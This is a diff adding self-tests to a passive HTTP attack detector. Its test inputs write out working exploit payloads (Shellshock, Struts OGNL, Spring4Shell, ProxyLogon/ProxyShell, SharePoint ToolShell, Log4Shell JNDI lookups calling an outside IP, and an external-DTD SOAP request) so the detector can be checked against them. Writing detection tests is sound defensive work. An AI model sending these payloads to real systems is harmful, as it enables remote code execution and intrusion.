+       'HTTP-080' not in {f.code for f in feed(get_ua(b'(){ :;}; /bin/id'))})
+    ck('http080_payload_not_logged',
+       fs and '/bin/id' not in json.dumps([f.to_dict() for f in fs], default=str))
+
+    # Tier E (v3): Struts S2-045 needs all three conditions in the Content-Type: the
+    # multipart/form-data literal, a value NOT starting with multipart/, and an OGNL
+    # opener. An ordinary multipart upload must stay silent.
+    def post_ct(ct):
+        return (b'POST /upload.action HTTP/1.1\r\nHost: app\r\nContent-Type: ' + ct
+                + b'\r\nContent-Length: 0\r\n\r\n')
+    ck('http084_struts_s2045',
+       'HTTP-084' in {f.code for f in feed(post_ct(
+           b"%{(#_='multipart/form-data').(#cmd='id')}"))})
+    ck('http084_real_multipart_silent',
+       'HTTP-084' not in {f.code for f in feed(post_ct(
+           b'multipart/form-data; boundary=----x'))})
+
+    # Tier F (v3): Spring4Shell class.module.classLoader bean path in a form body;
+    # an ordinary field named like it ('className') stays silent.
+    def post_form(body):
+        return (b'POST /greeting HTTP/1.1\r\nHost: app\r\nContent-Type: '
+                b'application/x-www-form-urlencoded\r\nContent-Length: %d\r\n\r\n'
+                % len(body)) + body
+    ck('http083_spring4shell',
+       'HTTP-083' in {f.code for f in feed(post_form(
+           b'class.module.classLoader.resources.context.parent.pipeline.first.pattern=x'))})
+    ck('http083_benign_field_silent',
+       'HTTP-083' not in {f.code for f in feed(post_form(b'className=report&id=7'))})
+
+    # v4: Exchange ProxyLogon - the X-BEResource host part fails Uri.CheckHostName
+    # (the patch's own check, inverted); a plain FQDN back end stays silent.
+    def ecp(cookie):
+        return (b'POST /ecp/favicon.ico HTTP/1.1\r\nHost: exch.corp\r\nCookie: ' + cookie
+                + b'\r\nContent-Length: 0\r\n\r\n')
+    fs = feed(ecp(b'X-BEResource=@backend.example.local:444/ecp/proxyLogon.ecp#~1941962753'))
+    ck('http086_proxylogon',
+       any(f.code == 'HTTP-086' and 'CVE-2021-26855' in f.cves for f in fs))
+    ck('http086_fqdn_backend_silent',
+       'HTTP-086' not in {f.code for f in feed(ecp(
+           b'X-BEResource=exch01.corp.example.com~1942062522'))})
+    ck('http086_two_tildes_silent',          # Exchange's own FromString rejects it
+       'HTTP-086' not in {f.code for f in feed(ecp(
+           b'X-BEResource=localhost/ecp/x.ecp~bad~1942062522'))})
+    # Uri.CheckHostName accepts an UNbracketed IPv6 literal (measured by the module
+    # author against .NET), so a bare-IPv6 back end must stay silent. The module's own
+    # suite covers this only through its Mono cross-check; this guards it without Mono.
+    ck('http086_bare_ipv6_backend_silent',
+       'HTTP-086' not in {f.code for f in feed(ecp(
+           b'X-BEResource=2001:db8::1~1942062522'))}
+       and 'HTTP-086' not in {f.code for f in feed(ecp(
+           b'X-BEResource=[2001:db8::1]~1942062522'))})
+
+    # v4: Exchange ProxyShell (unauthenticated) / ProxyNotShell (authenticated); the
+    # dot-segment path form is the evasion that beat the URL-rewrite mitigations.
+    def ad(path, auth=b''):
+        return (b'GET ' + path + b'?@evil.corp/?&Email=autodiscover/autodiscover.json%3F'
+                b'@evil.corp HTTP/1.1\r\nHost: exch.corp\r\n' + auth + b'\r\n')
+    fs = feed(ad(b'/autodiscover/autodiscover.json'))
+    ck('http087_proxyshell',
+       any(f.code == 'HTTP-087' and f.evidence.get('attack') == 'ProxyShell' for f in fs))
+    fs = feed(ad(b'/autodiscover/autodiscover.json',
+                 auth=b'Authorization: Basic dXNlcjpwdw==\r\n'))
+    ck('http087_proxynotshell_no_auth_logged',
+       any(f.code == 'HTTP-087' and f.evidence.get('attack') == 'ProxyNotShell'
+           for f in fs)
+       and 'dXNlcjpwdw' not in json.dumps([f.to_dict() for f in fs], default=str))
+    ck('http087_dot_segment_evasion',
+       'HTTP-087' in {f.code for f in feed(ad(b'/autodiscover/./autodiscover.json'))})
+    ck('http087_plain_autodiscover_silent',
+       'HTTP-087' not in {f.code for f in feed(
+           b'GET /autodiscover/autodiscover.json?Email=user@corp.example&Protocol=EWS'
+           b' HTTP/1.1\r\nHost: exch.corp\r\n\r\n')})
+
+    # v4: SharePoint ToolShell - sign-out Referer + ToolPane, incl. the trailing-slash
+    # patch bypass; the same Referer on an ordinary page is not an alert.
+    def sp(target, referer):
+        return (b'POST ' + target + b' HTTP/1.1\r\nHost: sp.corp\r\nReferer: ' + referer
+                + b'\r\nContent-Length: 0\r\n\r\n')
+    ck('http088_toolshell',
+       'HTTP-088' in {f.code for f in feed(sp(b'/_layouts/15/ToolPane.aspx?DisplayMode=Edit',
+                                              b'/_layouts/SignOut.aspx'))})
+    ck('http088_trailing_slash_bypass',
+       'HTTP-088' in {f.code for f in feed(sp(b'/_layouts/15/ToolPane.aspx/',
+                                              b'/_layouts/15/SignOut.aspx'))})
+    ck('http088_double_slash_referer_silent',   # System.Uri keeps '//': not sign-out
+       'HTTP-088' not in {f.code for f in feed(sp(b'/_layouts/15/ToolPane.aspx',
+                                                  b'/_layouts//SignOut.aspx'))})
+    ck('http088_signout_elsewhere_not_alert',
+       'HTTP-088' not in {f.code for f in feed(sp(b'/_layouts/15/start.aspx',
+                                                  b'/_layouts/SignOut.aspx'))})
+
+    # v5: phpAfterShell - a serialized-object header in a stored multipart parameter.
+    # `stored` reflects PHP's necessary condition (a non-file, non-empty part first);
+    # OWS before '=' means PHP never sees the parameter, so it stays silent.
+    obj = b'O:8:\\"stdClass\\":0:{}'
+
+    def php_mp(parts):
+        body = b''.join(b'------pb\r\n' + h + b'\r\n\r\n' + v + b'\r\n' for h, v in parts)
+        body += b'------pb--\r\n'
+        return (b'POST /s.php HTTP/1.1\r\nHost: x\r\nCookie: PHPSESSID=abc\r\n'
+                b'Content-Type: multipart/form-data; boundary=----pb\r\n'
+                b'Content-Length: %d\r\n\r\n' % len(body)) + body
+    prog = (b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"', b'tok')
+
+    def filep(disp):
+        return (b'Content-Disposition: form-data; ' + disp + b'\r\nContent-Type: text/plain',
+                b'd')
+    fs = feed(php_mp([prog, filep(b'name="f1"; filename="x|' + obj + b'"')]))
+    ck('http089_phpaftershell_stored',
+       any(f.code == 'HTTP-089' and f.evidence.get('stored') is True
+           and 'CVE-2026-126714' in f.cves for f in fs)
+       and 'PHPSESSID=abc' not in json.dumps([f.to_dict() for f in fs], default=str))
+    fs = feed(php_mp([filep(b'name="f1"; filename="x|' + obj + b'"')]))
+    ck('http089_nothing_precedes_not_stored',
+       any(f.code == 'HTTP-089' and f.evidence.get('stored') is False for f in fs))
+    ck('http089_ows_before_equals_silent',
+       'HTTP-089' not in {f.code for f in feed(php_mp(
+           [prog, filep(b'name="f1"; filename ="x|' + obj + b'"')]))})
+    ck('http089_ordinary_upload_silent',
+       'HTTP-089' not in {f.code for f in feed(php_mp(
+           [prog, filep(b'name="f1"; filename="rapport final.pdf"')]))})
+
+    # v5: Log4Shell / Text4Shell - the substitution grammar is walked, so the
+    # obfuscated form fires; a body quoting the string is never scanned.
+    def hdr(name, value):
+        return b'GET / HTTP/1.1\r\nHost: v\r\n' + name + b': ' + value + b'\r\n\r\n'
+    fs = feed(hdr(b'User-Agent', b'${jndi:ldap://203.0.113.7:1389/a}'))
+    ck('http091_log4shell',
+       any(f.code == 'HTTP-091' and 'CVE-2021-44228' in f.cves for f in fs))
+    ck('http091_obfuscated_lower_lookup',
+       'HTTP-091' in {f.code for f in feed(hdr(b'X-Api-Version',
+                                               b'${${lower:j}ndi:ldap://h/a}'))})
+    ck('http091_ipv6_parity',
+       'HTTP-091' in {f.code for f in feed(hdr(b'Referer', b'${jndi:dns://h/a}'),
+                                           src='fd00::9', dst='fd00::5')})
+    jb = b'{"ua":"${jndi:ldap://h/a}"}'
+    ck('http091_body_never_scanned',
+       'HTTP-091' not in {f.code for f in feed(
+           b'POST /log HTTP/1.1\r\nHost: v\r\nContent-Type: application/json\r\n'
+           b'Content-Length: %d\r\n\r\n' % len(jb) + jb)})
+    ck('http091_plain_dollar_brace_silent',
+       'HTTP-091' not in {f.code for f in feed(hdr(b'User-Agent', b'${java:version}'))})
+    ck('http092_text4shell',
+       any(f.code == 'HTTP-092' and 'CVE-2022-42889' in f.cves
+           for f in feed(hdr(b'User-Agent', b'${script:javascript:1}'))))
+
+    # v7: Struts parameter-name rules. HTTP-093 - a field overwriting a property Struts
+    # sets itself for a file part (case variant / OGNL prefix); a lookalike stays silent.
+    def st_mp(parts, target=b'/upload.action'):
+        body = b''.join(b'------sb\r\n' + h + b'\r\n\r\n' + v + b'\r\n' for h, v in parts)
+        body += b'------sb--\r\n'
+        return (b'POST ' + target + b' HTTP/1.1\r\nHost: v\r\nContent-Type: multipart/'
+                b'form-data; boundary=----sb\r\nContent-Length: %d\r\n\r\n'
+                % len(body)) + body
+
+    def st_file(name):
+        return (b'Content-Disposition: form-data; name="' + name
+                + b'"; filename="a.txt"\r\nContent-Type: text/plain', b'DATA')
+
+    def st_field(name, val=b'x'):
+        return (b'Content-Disposition: form-data; name="' + name + b'"', val)
+    ck('http093_struts_upload_override',
+       'HTTP-093' in {f.code for f in feed(st_mp(
+           [st_file(b'Upload'), st_field(b'top.UploadFileName', b'../../x.jsp')]))})
+    ck('http093_lookalike_field_silent',
+       'HTTP-093' not in {f.code for f in feed(st_mp(
+           [st_file(b'doc'), st_field(b'docFileNameHint', b'x')]))})
+
+    def st_q(q):
+        return b'GET /x.action?' + q + b' HTTP/1.1\r\nHost: v\r\n\r\n'
+    ck('http094_struts_redirect_ognl',
+       'HTTP-094' in {f.code for f in feed(st_q(b'redirect:%24%7B%231%7D=1'))})
+    ck('http094_plain_redirect_silent',
+       'HTTP-094' not in {f.code for f in feed(st_q(b'redirect:%2Flogin=1'))}
+       and 'HTTP-094' not in {f.code for f in feed(st_q(b'redirect:%2524%7Bx%7D=1'))})
+    ck('http095_struts_dmi_ognl',
+       'HTTP-095' in {f.code for f in feed(st_q(b'method:%23_memberAccess=1'))})
+    ck('http095_java_identifier_silent',
+       'HTTP-095' not in {f.code for f in feed(st_q(b'method:save=1'))}
+       and 'HTTP-095' not in {f.code for f in feed(st_q(b'method:%24init=1'))})
+
+    # v7: Rack _method grammar (Ruby2Shell) - critical only with 0xDF on a text/plain
+    # part tagged with a growing legacy encoding; a real method name stays silent.
+    def rb(val, ctype=None):
+        h = b'Content-Disposition: form-data; name="_method"'
+        if ctype:
+            h += b'\r\nContent-Type: ' + ctype
+        body = b'------rb\r\n' + h + b'\r\n\r\n' + val + b'\r\n------rb--\r\n'
+        return (b'POST /users/1 HTTP/1.1\r\nHost: rails\r\nContent-Type: multipart/'
+                b'form-data; boundary=----rb\r\nContent-Length: %d\r\n\r\n'
+                % len(body)) + body
+    hits = [f for f in feed(rb(b'\xdf' * 21, b'text/plain; charset=ISO-8859-1'))
+            if f.code == 'HTTP-096']
+    ck('http096_ruby2shell_critical',
+       hits and hits[0].severity == 'critical' and 'CVE-2026-132825' in hits[0].cves)
+    hits = [f for f in feed(rb(b'\xdf' * 21, b'text/plain; charset=ISO-8859-7'))
+            if f.code == 'HTTP-096']
+    ck('http096_flat_encoding_warn_only', hits and hits[0].severity == 'warn')
+    ck('http096_real_method_silent',
+       'HTTP-096' not in {f.code for f in feed(rb(b'PATCH'))}
+       and 'HTTP-096' not in {f.code for f in feed(rb(b'M-SEARCH'))})
+
+    # v7: Axis inbound SOAP Fault (a Fault in a REQUEST) and DOCTYPE in a SOAP request.
+    e11 = 'http://schemas.xmlsoap.org/soap/envelope/'
+
+    def soap(xml):
+        xml = xml.encode()
+        return (b'POST /dms/services/ServerUI HTTP/1.1\r\nHost: nc.corp\r\n'
+                b'Content-Type: text/xml; charset=utf-8\r\nContent-Length: %d\r\n\r\n'
+                % len(xml)) + xml
+
+    def env(inner, prolog=''):
+        return (prolog + '<?xml version="1.0"?>' if not prolog else prolog) + \
+            f'<s:Envelope xmlns:s="{e11}"><s:Body>{inner}</s:Body></s:Envelope>'
+    fault = ('<s:Fault><faultcode>s:Server</faultcode><faultstring>x</faultstring>'
+             '<detail><exceptionName>org.example.Gadget</exceptionName></detail></s:Fault>')
+    ck('http097_axis_inbound_fault',
+       any(f.code == 'HTTP-097' and 'CVE-2026-90436' in f.cves
+           for f in feed(soap(env(fault)))))
+    ck('http097_fault_without_exceptionname_silent',
+       'HTTP-097' not in {f.code for f in feed(soap(env(
+           '<s:Fault><faultcode>s:Server</faultcode><faultstring>x</faultstring>'
+           '</s:Fault>')))})
+    hits = [f for f in feed(soap(env('<ns:p xmlns:ns="urn:x"/>',
+                                     '<!DOCTYPE s:Envelope SYSTEM "http://evil.example/e.dtd">')))
+            if f.code == 'HTTP-098']
+    ck('http098_soap_external_doctype_critical', hits and hits[0].severity == 'critical')
+    ck('http098_escaped_doctype_text_silent',
+       'HTTP-098' not in {f.code for f in feed(soap(env(
+           '<ns:p xmlns:ns="urn:x">&lt;!DOCTYPE x&gt;</ns:p>')))})
+
+    # v7: N-central bypass needs BOTH halves; each half alone is a legitimate look-alike.
+    def nc(target, *hdrs):
+        return (b'GET ' + target + b' HTTP/1.1\r\nHost: nc.corp\r\n'
+                + b''.join(h + b'\r\n' for h in hdrs) + b'\r\n')
+    ck('http099_ncentral_bypass',
+       'HTTP-099' in {f.code for f in feed(nc(b'/dms;x=1/services/ServerUI',
+                                             b'Forwarded: for="12\\7.0.0.1"'))})
+    ck('http099_ipv6_escape',
+       'HTTP-099' in {f.code for f in feed(nc(b'/dms;x=1/services/ServerUI',
+                                             b'Forwarded: for="[::\\1]"'))})
+    ck('http099_one_half_alone_silent',
+       'HTTP-099' not in {f.code for f in feed(nc(b'/dms;jsessionid=ABC/services/ServerUI'))}
+       and 'HTTP-099' not in {f.code for f in feed(nc(
+           b'/dms/services/ServerUI', b'Forwarded: for="12\\7.0.0.1"'))})
+    ck('http099_encoded_semicolon_silent',
+       'HTTP-099' not in {f.code for f in feed(nc(b'/dms%3Bx=1/services/ServerUI',
+                                                 b'Forwarded: for="12\\7.0.0.1"'))})
+
+    # Tier G (v3): Brotli arming is always reported; a refused library raises. When
+    # the host decoder is patched, a valid br body decodes clean and stays silent.
+    _probe, _bst = _http_brotli()
+    ck('http090_arming_reported',
+       isinstance(_bst.get('armed'), bool)
+       and (_bst['armed'] == (_probe is not None))
+       and (_bst['armed'] or bool(_bst.get('reason'))))
+    try:
+        hw.arm_brotli('/nonexistent/libbrotlidec.so.1')
+        refused = False
+    except hw.BrotliArmingError:
+        refused = True
+    ck('http090_refuses_unprovable_decoder', refused)
+    if _probe is not None:
+        try:
+            import brotli as _br
+            comp = _br.compress(b'ragnar passive detection ' * 200, quality=5)
+            req = (b'POST /api HTTP/1.1\r\nHost: app\r\nContent-Encoding: br\r\n'
+                   b'Content-Length: %d\r\n\r\n' % len(comp)) + comp
+            w = hw.HttpWatch(cfg=hw.WatchConfig(brotli=_probe))
+            out = w.feed('192.168.1.9:40000-192.168.1.5:80', '192.168.1.9',
+                         '192.168.1.5', 80, req, True, now=1000.0)
+            ck('http090_valid_stream_silent', 'HTTP-090' not in {f.code for f in out})
+        except ImportError:
+            pass
+
     # verdict ladder (every token already lives in the Net Integrity sets).
     def mk(code, sev):
         return {'code': code, 'severity': sev}
@@ -16645,12 +17329,13 @@ def _http_selftest():
        and _http_verdict([], True) == 'clean'
        and _http_verdict([], False) == 'no-traffic')
 
-    # catalog shape: 28 codes over tiers A-D; every attributed CVE is pinned in the
-    # catalog with a score; nothing deferred is also attributed.
+    # catalog shape: 49 codes over tiers A-G (v7); every attributed CVE is pinned in
+    # the catalog with a score; nothing deferred is also attributed.
     attributed = {c for d in hw.FINDING_REGISTRY.values() for c in d.cves}
     ck('catalog_shape',
-       len(hw.FINDING_REGISTRY) == 28
-       and {d.tier for d in hw.FINDING_REGISTRY.values()} == {'A', 'B', 'C', 'D'}
+       len(hw.FINDING_REGISTRY) == 49
+       and {d.tier for d in hw.FINDING_REGISTRY.values()}
+       == {'A', 'B', 'C', 'D', 'E', 'F', 'G'}
        and all(hw.CVE_CATALOG.get(c, {}).get('score') for c in attributed)
        and not (attributed & set(hw.DEFERRED_CVES)))
 
@@ -16662,7 +17347,7 @@ def _http_selftest():
        nrm['severity'] == 'HIGH' and nrm['klass'] == 'EXPOSURE'
        and nrm['src'] == '192.168.1.9' and nrm['code'] == 'HTTP-040')
 
-    # the vendored engine's own full suite (440 checks). Its counters are module
+    # the vendored engine's own full suite (2323 checks). Its counters are module
     # globals, so reset them first or a second panel run would accumulate; it
     # prints a report, so capture that so do_routing_selftest stays quiet.
     try:
@@ -16690,6 +17375,15 @@ def _http_selftest():
                                wrpcap)
         em = {'src': '02:00:00:00:00:01', 'dst': '02:00:00:00:00:02'}
         clean = b'GET / HTTP/1.1\r\nHost: intranet\r\n\r\n'
+        shock = (b'GET /cgi-bin/test.cgi HTTP/1.1\r\nHost: nas\r\n'
+                 b'Referer: () { :;}; /bin/id\r\n\r\n')
+        ncb = (b'GET /dms;x=1/services/ServerUI HTTP/1.1\r\nHost: nc.corp\r\n'
+               b'Forwarded: for="[::\\1]"\r\n\r\n')
+        log4 = (b'GET /api HTTP/1.1\r\nHost: app\r\n'
+                b'X-Api-Version: ${${lower:j}ndi:ldap://203.0.113.7/a}\r\n\r\n')
+        toolshell = (b'POST /_layouts/15/ToolPane.aspx?DisplayMode=Edit HTTP/1.1\r\n'
+                     b'Host: sp.corp\r\nReferer: /_layouts/SignOut.aspx\r\n'
+                     b'Content-Length: 0\r\n\r\n')
         frames = [
             Ether(**em) / IP(src='192.168.1.9', dst='192.168.1.5')
             / TCP(sport=40000, dport=80, flags='PA') / Raw(load=smug),
@@ -16697,6 +17391,14 @@ def _http_selftest():
             / TCP(sport=40001, dport=8080, flags='PA') / Raw(load=smug),
             Ether(**em) / IP(src='192.168.1.20', dst='192.168.1.5')
             / TCP(sport=40002, dport=80, flags='PA') / Raw(load=clean),
+            Ether(**em) / IPv6(src='fd00::30', dst='fd00::5') / IPv6ExtHdrHopByHop()
+            / TCP(sport=40003, dport=80, flags='PA') / Raw(load=shock),
+            Ether(**em) / IPv6(src='fd00::31', dst='fd00::6') / IPv6ExtHdrHopByHop()
+            / TCP(sport=40004, dport=80, flags='PA') / Raw(load=toolshell),
+            Ether(**em) / IPv6(src='fd00::32', dst='fd00::7') / IPv6ExtHdrHopByHop()
+            / TCP(sport=40005, dport=8080, flags='PA') / Raw(load=log4),
+            Ether(**em) / IPv6(src='fd00::33', dst='fd00::8') / IPv6ExtHdrHopByHop()
+            / TCP(sport=40006, dport=80, flags='PA') / Raw(load=ncb),
         ]
         fd_, pth = _tf.mkstemp(suffix='.pcap', prefix='httpwatch_selftest_')
         _os.close(fd_)
@@ -16710,6 +17412,20 @@ def _http_selftest():
         ck('pcap_clean_client_silent',
            not any(f.get('client') == '192.168.1.20' for f in rr.get('findings', [])))
         ck('pcap_verdict_attack', rr.get('verdict') == 'attack')
+        ck('pcap_http080_ipv6_exthdr',
+           any(f['code'] == 'HTTP-080' and f['af'] == 'ipv6'
+               for f in rr.get('findings', [])))
+        ck('pcap_brotli_status_reported', isinstance(rr.get('brotli'), dict))
+        ck('pcap_http088_ipv6_exthdr',
+           any(f['code'] == 'HTTP-088' and f['af'] == 'ipv6'
+               for f in rr.get('findings', [])))
+        ck('pcap_http091_ipv6_exthdr',
+           any(f['code'] == 'HTTP-091' and f['af'] == 'ipv6'
+               for f in rr.get('findings', [])))
+        ck('pcap_walker_budget_reported', 'walker_budget_exceeded' in rr)
+        ck('pcap_http099_ipv6_exthdr',
+           any(f['code'] == 'HTTP-099' and f['af'] == 'ipv6'
+               for f in rr.get('findings', [])))
         scapy_result = {'ran': True, 'findings': len(rr.get('findings', []))}
     except ImportError as e:
         scapy_result = {'ran': False, 'reason': str(e)}
